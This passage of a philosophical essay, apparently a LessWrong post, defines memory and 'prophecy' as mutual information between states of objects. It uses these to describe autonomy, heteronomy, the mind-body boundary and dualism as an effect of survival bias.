@font-face {font-family: MJXc-TeX-type-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Typewriter-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Typewriter-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Typewriter-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-cal-R; src: local('MathJax_Caligraphic'), local('MathJax_Caligraphic-Regular')}
@font-face {font-family: MJXc-TeX-cal-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Caligraphic-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Caligraphic-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Caligraphic-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-main-B; src: local('MathJax_Main Bold'), local('MathJax_Main-Bold')}
@font-face {font-family: MJXc-TeX-main-Bx; src: local('MathJax_Main'); font-weight: bold}
@font-face {font-family: MJXc-TeX-main-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Main-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Main-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Main-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-main-I; src: local('MathJax_Main Italic'), local('MathJax_Main-Italic')}
@font-face {font-family: MJXc-TeX-main-Ix; src: local('MathJax_Main'); font-style: italic}
@font-face {font-family: MJXc-TeX-main-Iw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Main-Italic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Main-Italic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Main-Italic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-main-R; src: local('MathJax_Main'), local('MathJax_Main-Regular')}
@font-face {font-family: MJXc-TeX-main-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Main-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Main-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Main-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-math-I; src: local('MathJax_Math Italic'), local('MathJax_Math-Italic')}
@font-face {font-family: MJXc-TeX-math-Ix; src: local('MathJax_Math'); font-style: italic}
@font-face {font-family: MJXc-TeX-math-Iw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Math-Italic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Math-Italic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Math-Italic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size1-R; src: local('MathJax_Size1'), local('MathJax_Size1-Regular')}
@font-face {font-family: MJXc-TeX-size1-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size1-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size1-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size1-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size2-R; src: local('MathJax_Size2'), local('MathJax_Size2-Regular')}
@font-face {font-family: MJXc-TeX-size2-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size2-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size2-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size2-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size3-R; src: local('MathJax_Size3'), local('MathJax_Size3-Regular')}
@font-face {font-family: MJXc-TeX-size3-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size3-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size3-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size3-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size4-R; src: local('MathJax_Size4'), local('MathJax_Size4-Regular')}
@font-face {font-family: MJXc-TeX-size4-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size4-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size4-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size4-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-vec-R; src: local('MathJax_Vector'), local('MathJax_Vector-Regular')}
@font-face {font-family: MJXc-TeX-vec-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Vector-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Vector-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Vector-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-vec-B; src: local('MathJax_Vector Bold'), local('MathJax_Vector-Bold')}
@font-face {font-family: MJXc-TeX-vec-Bx; src: local('MathJax_Vector'); font-weight: bold}
@font-face {font-family: MJXc-TeX-vec-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Vector-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Vector-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Vector-Bold.otf') format('opentype')}
</style></p><p>A can have memories about more than one Bs, or about different moments of B. It can also have memories about itself, in other words, A can be equal to B.</p><p> <strong>Prophecy</strong> is the mutual information between the present state of A and a future state of B:</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="P(A,B,t)=I(A(t_0);B(t)), &nbsp; t>t_0"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.064em;">I</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.151em; padding-bottom: 0.519em;">;</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.225em; padding-bottom: 0.372em;">>;</span></span> <span class="mjx-msubsup MJXc-space3"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span></span></span></span></span></span></p><p> Obviously, the prophecy will not be confirmed until the future state of B is known.</p><p> A prophecy can be either a prediction about the future, or an action that controls/affects the future. In the language of the <a href="https://direct.mit.edu/books/oa-monograph/5299/Active-InferenceThe-Free-Energy-Principle-in-Mind">Active Inference</a> model, it&#39;s either &quot;change my model&quot; or &quot;change the world&quot;.</p><p> It&#39;s not necessary to prefer one interpretation over another, because different interpretations can be derived in different situations, which will be explained in the later chapters. </p><p><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/o2ncra8iua87bucaqcjj" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/x59yo9gi6m2t6lhwmi4m 190w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/hinefdk6aqt85he60f7n 380w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/y635sfgtqts4yyi8lnm0 570w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/idxrp4jnif7jwlvnp0l3 760w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/stfkrzvpadgosu4ultrj 950w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/wrus6qunfzdxmf8t0h24 1140w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/ftbc9xidqv4bbsivwmui 1330w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/pu87jg7dx4jmmu0j8uqj 1520w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/wlak3vxqi8f5r7eqsiho 1710w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/ccppmmekugmfbg2ufvyl 1826w"><br> <i>Figure 2: Object A can have both memories and prophecies about object B.</i><br></p><h2> <strong>Collect Memories for Prophecies</strong></h2><p> We won&#39;t be surprised to find that most, if not all, objects that have prophecies about object A also have memories about it, although the reverse is not always true. We can speculate that information about the future comes from information about the past.</p><p> For example, if you know the position and velocity of the moon in the past, you can have a lot of information about its position and velocity in the future.</p><p> Not all information is created equal. Using our moon as an example, information about its position and phase contains more information about its future, while the pattern of foam in your coffee cup contains less.</p><p> <i>(Although computing power plays an important role in processing information from memory to prediction or control, we only consider the upper bound of prophecy as if we had infinite computing power. )</i></p><p> Objects with different memories would have different prophecies about the same object. For example, an astronomer and an astrologer would have different information about the future of the planet Mars because of their different knowledge of the universe.</p><p> Intelligence needs prophecy to survive and thrive, because to maintain its homeostasis and achieve its goals, it needs sufficient information about the future, especially about its own future. In order to obtain prophecies about itself, one should collect memories about itself and the world that are useful for predicting or controlling its own future.<br></p><h2> <strong>Autonomy and Heteronomy</strong></h2><p> We can measure the <strong>degree of autonomy</strong> of an object by how much prophecy it has about a future of itself, which indicates its self-governance and independence.</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="D_a(A,t) = P(A(t_0),A(t))"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">D</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mi" style=""><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">a</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span></span></span></span></span></span></p><p> Similarly, we can measure the <strong>degree of heteronomy</strong> of object A from object B by how much prophecy B has about A, which indicates A&#39;s degree of dependence on B.</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="D_h(A,B,t) = P(B(t_0),A(t))"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">D</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.219em; padding-right: 0.071em;"><span class="mjx-mi" style=""><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">h</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">B</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-msubsup"><span class="mjx-base"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span></span> <span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span class="mjx-mn" style=""><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">0</span></span></span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="margin-top: -0.144em; padding-bottom: 0.519em;">,</span></span> <span class="mjx-mi MJXc-space1"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.519em; padding-bottom: 0.298em;">A</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">t</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span></span></span></span></span></span></p><p> An object that has considerable autonomy can be considered an <strong>individual</strong> or an agent. The permanent loss of autonomy is the <strong>death</strong> of an individual. Death is often the result of the permanent loss of essential memories that can induce prophecies about itself.</p><p> Focusing on different types of information requires different standards for autonomy and death. For example, a human neuron has some autonomy over its metabolism, but the timing and strength of its action potential depends mostly on other neurons. We can think of it as an individual, but it is better to think of it as a part of an individual when studying intelligence. Because the death of a single neuron has little effect on a person&#39;s autonomy, but the death of a person does. </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/u5iafy5zmbajbwnztx6x" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/exjglmd0smykwlmgxr06 90w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/driduuta9smhjpxi84cz 180w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/jb39pddgzba0p2ya55ha 270w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/fnrcz0hbic1mcbzrdhqr 360w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/v7dnlmjix92met7iwjrg 450w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/jxjcatvrkfwpgktsnvvl 540w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/wa7tr6yqbqt66ibdimvm 630w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/iyyybo5vbp6qlxy9j0s3 720w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/ncyautqo9hktff32phyo 810w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/avjpr3xr37wzdugycayo 876w"></figure><p> <i>Figure 3: Autonomy and Heteronomy</i><br></p><h2> <strong>The Laws of the Mind</strong></h2><p> As an individual accumulates more and more memories and prophecies, it can discover general rules about the world, which are relationships between the past and the future.</p><p> During this rule-learning process, the boundary between the self and the outside world emerges. One will inevitably find out that<strong> </strong><i>some parts of the world follow different rules than other parts</i> , and these special parts are spatially concentrated around itself. We can call this special part the <strong>body</strong> .</p><p> For example, an individual may acknowledge that its body temperature has never been very high, like, say above 1000K, and predict that its body will never experience a temperature above 1000K, if its future is under control. Since some other objects can have a temperature of 1000K, it will conclude that there must be some special rules that prevent one&#39;s body from getting too hot. We call these rules goals, motivations, or emotions, etc.</p><p> The intuitive conclusion is that your body follows some rules that are different from the rules that other objects follow. This is what people call dualism: the body follows the <strong>laws of the mind</strong> , which uses concepts like goals, emotions, logic, etc., while the outside world doesn&#39;t.</p><p> However, the exact boundary between the body and the environment is not very clear. The space surrounding the body may partly follow the laws of the mind and can be called <strong>peripersonal space</strong> , a term borrowed from psychology.</p><p> <i>(Closer examination will reveal that the body and peripersonal space also follow the same scientific laws as the outside world, and the laws of mind are some additional laws that only bodies follow.)</i> </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/yglpx2i2jgom0dug2hdn" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/sy4goovwhu18e6ihgjwd 130w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/ebgk6j4s88unhlkj1w0t 260w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/rwucnxeytevi4b7zqtqz 390w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/jae02t6duleubcepc99x 520w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/qtu9k0c6qalzb91dajne 650w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/xmmmksiszxivbcvurwtu 780w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/isnkects4ie5oig7lqvz 910w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/dhdzjgi7xyhavkko1ped 1040w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/rwdgxtvtbhpoomms5nzv 1170w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/FRd6nNj3M33w2CSX5/zglq0qd96yfufjeggva5 1246w"></figure><p> <i>Figure 4: Everything in the universe follows the laws of physics, but additionally, one&#39;s body and peripersonal space follow the laws of the mind.</i></p><h2><br> <strong>Dualism and Survival Bias</strong></h2><p> Why do our bodies seem to follow the laws of mind, if bodies are made of the same atoms as the outside world?</p><p> Consider a classic example of survival bias. During World War II, the statistician <a href="https://en.wikipedia.org/wiki/Survivorship_bias#Military">Abraham Wald examined the bullet holes in returning aircrafts</a> and recommended adding armor to the areas that showed the least damage, because most aircrafts damaged in those areas could not return safely to base.</p><p> This survival bias could be overcome by observing the aircraft on the battlefield instead of at the base, where we could find out that the bullet holes are evenly distributed throughout the aircraft, since the survival of the observer is independent of the location of the bullet holes. Because a survival bias is introduced when the observer&#39;s survival is not independent of the observed event.</p><p> We can speculate that if an event is in principle dependent on the observer&#39;s own survival, there will be a survival bias that can&#39;t be overcome. For example, one&#39;s own body temperature is not independent of one&#39;s own survival, but the body temperature of others can be.</p><p> Unlike the pattern of bullet holes in returning aircrafts, the inherent survival bias, including numerous experiences of how to survive, can accumulate in the observer&#39;s memory, like the increased armor in the critical areas of an aircraft. We call the memories of accumulated survival bias the <strong>inward memory</strong> , and the memories of the external world, whose survival bias can be overcome, the <strong>outward memory</strong> .</p><p> The laws of the mind, such as goal-directed mechanisms, can be derived from the inward memory. The observer may find that (almost) everything in the outside world has a cause, but its own goal-driven survival mechanism, such as an aversion to hot temperature, or enhanced armor, has no cause other than the rule &quot;the survival of itself depends on the survival of itself&quot;, or the existence of itself. Then the observer comes to a conclusion: I have a goal, I have made a choice.</p><p><br><br><br></p><br/><br/> <a 